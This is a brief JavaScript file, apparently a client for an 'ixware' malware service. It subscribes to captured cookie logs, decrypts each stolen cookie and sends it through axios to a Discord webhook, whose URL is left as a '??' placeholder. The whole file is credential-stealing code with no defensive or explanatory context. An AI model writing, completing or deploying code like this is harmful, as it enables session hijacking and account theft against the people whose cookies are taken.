var ixware = require("ixware-v1");
var axios = require('axios');

ixware.connect("s");

ixware.cookielog(function(log){

  ixware.decrypt(log.cookie).then(function(decrypted){
    sendDiscord(`Received a new cookie: ${decrypted}`);
  })
})

function sendDiscord(string){

  let axiosConfig = {
    headers: {
        'Content-Type': 'application/json'
    }
  };

  var postData = {
      content: string,
      username: "Webhook"
  };

  try {
      axios.post('??', postData, axiosConfig);
  }catch (error){
      return error;
  }
}